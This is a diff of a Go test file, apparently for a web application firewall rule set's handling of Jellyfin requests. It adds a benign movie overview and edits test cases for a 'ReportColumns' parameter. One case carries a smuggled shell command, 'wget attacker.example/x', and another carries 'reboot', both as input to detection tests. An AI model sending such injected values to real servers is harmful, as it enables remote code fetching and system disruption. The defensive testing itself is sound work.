@@ -230,6 +230,7 @@ var jfOverviews = []string{
 	"Ein pensionierter Uhrmacher entdeckt auf dem Dachboden einen Brief aus dem Jahr 1923 – und macht sich auf die Suche nach der Absenderin.",
 	"In a city where music is outlawed, a street sweeper named Juno hides a radio under her floorboards... until the night someone else starts listening. Based on the novel by Ada Wren.",
 	`Leo and Priya's plan to save the bakery goes sideways when the inspector shows up early; meanwhile, Gran's "secret recipe" turns out to be anything but.`,
+	"A heist comedy shot for $4 million: two brothers, one 24/7 diner and a safe nobody can open.",
 }
 
 // jfProfiles are FFmpeg's names for a codec's profile that hold more than
@@ -865,8 +866,8 @@ func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 		// And only a list of its columns is not read for commands.
 		{1, jfRequest{"GET", "/Reports/Items?" + jfReport(g.id(), "ReportColumns", "Name|Runtime;wget attacker.example/x"), "", "", false, c}},
 		{1, jfRequest{"GET", "/Reports/Items?" + jfReport(g.id(), "ReportColumns", "Name|reboot"), "", "", false, c}},
-		{1, jfRequest{"GET", "/Reports/Items?" + jfReport(g.id(), "ReportColumns", jfReportDefaults[0]) + "&ReportColumns=Name", "", "", false, c}},
-		{1, jfRequest{"GET", "/Items?userId=" + g.id() + "&ReportColumns=" + uriComponent(jfReportDefaults[0]), "", "", false, c}},
+		{1, jfRequest{"GET", "/Reports/Items?" + jfReport(g.id(), "ReportColumns", strings.Join(jfReportColumns, "|")) + "&ReportColumns=Name", "", "", false, c}},
+		{1, jfRequest{"GET", "/Items?userId=" + g.id() + "&ReportColumns=" + uriComponent(strings.Join(jfReportColumns, "|")), "", "", false, c}},
 		{2, jfRequest{"POST", "/DisplayPreferences/usersettings?client=emby", js, vwJSON(map[string]any{"CustomPrefs": map[string]any{"x": `{"a":"1 or 1"}`}}), false, c}},
 		// Outside the arguments the set knows, text is read as CRS reads it.
 		{2, jfRequest{"GET", "/Items?userId=" + g.id() + "&overview=" + url.QueryEscape("It's a trap: 'quoted' -- (really)!"), "", "", false, c}},
